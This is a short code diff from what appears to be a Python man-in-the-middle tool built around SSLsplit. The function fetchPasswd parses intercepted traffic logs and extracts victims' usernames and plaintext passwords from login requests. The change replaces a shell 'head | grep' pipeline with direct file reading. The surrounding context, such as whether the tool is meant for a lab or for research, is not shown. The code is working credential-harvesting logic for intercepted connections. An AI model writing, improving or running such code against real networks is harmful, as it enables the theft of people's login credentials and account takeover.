@@ -18,13 +18,14 @@ def fetchPasswd():
 
     filenames = os.listdir("MITM/logdir")
     for filename in filenames:
-        commandStr = 'head -n 20 {} | grep "logintoken"'.format("MITM/logdir/" + filename)
-        content = os.popen(commandStr).read()
-        if len(content) > 0:
-            usernameIndex = content.find("&username")
-            passwordIndex = content.find("&password")
-            tokenIndex = content.find("&token")
-            result.append({"username": content[usernameIndex + 10:passwordIndex], "password": content[passwordIndex + 10:tokenIndex]})
+        with open("MITM/logdir/" + filename, "r", encoding = "utf-8", errors = "ignore") as fp:
+            lines = fp.readlines()
+            for content in lines:
+                if content[0:10] == "logintoken":
+                    usernameIndex = content.find("&username")
+                    passwordIndex = content.find("&password")
+                    tokenIndex = content.find("&token")
+                    result.append({"username": content[usernameIndex + 10:passwordIndex], "password": content[passwordIndex + 10:tokenIndex]})
     return result
 
 def runSSLSplit():
